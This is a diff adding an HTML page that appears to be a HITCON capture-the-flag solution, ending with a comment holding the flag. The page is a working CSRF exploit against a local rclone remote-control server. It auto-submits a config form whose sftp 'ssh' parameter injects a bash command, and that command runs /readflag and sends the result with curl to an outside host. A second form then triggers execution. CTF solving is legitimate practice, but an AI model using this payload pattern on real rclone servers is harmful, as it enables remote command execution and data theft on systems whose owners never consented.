@@ -1,0 +1,28 @@
+<form action="http://rclone:5572/config/create" method="POST" id="cfgform" target="_blank">
+	<input name="name" value="yy" />
+	<input name="type" value="sftp" />
+	<!-- https://github.com/rclone/rclone/blob/7b8bbe531e0f062254b2d8ffe1e6284cd62309f6/fs/config/rc.go#L150 will parse parameters using json.Unmarshal -->
+	<input name="parameters" />
+	<button type="submit">Create</button>
+</form>
+<script>
+	cfgform.parameters.value = JSON.stringify({
+		// ssh: 'bash -c "touch /tmp/pwned"'
+		ssh: `bash -c "curl http://bot:8000/submit -d url=http://${location.host}/flag?flag=$(/readflag)"`
+	})
+</script>
+
+<form action="http://rclone:5572/operations/list" method="POST" id="listform" target="_blank">
+	<input name="fs" value="yy:" />
+	<input name="remote" value="" />
+	<button type="submit">Do List</button>
+</form>
+<script>
+	cfgform.submit()
+	setTimeout(() => {
+		listform.submit()
+	}, 1500)
+</script>
+<img src="/delay.php?seconds=5" />
+<!-- hitcon{easy_peasy_rce_using_csrf_attacking_local_server} -->
+ 
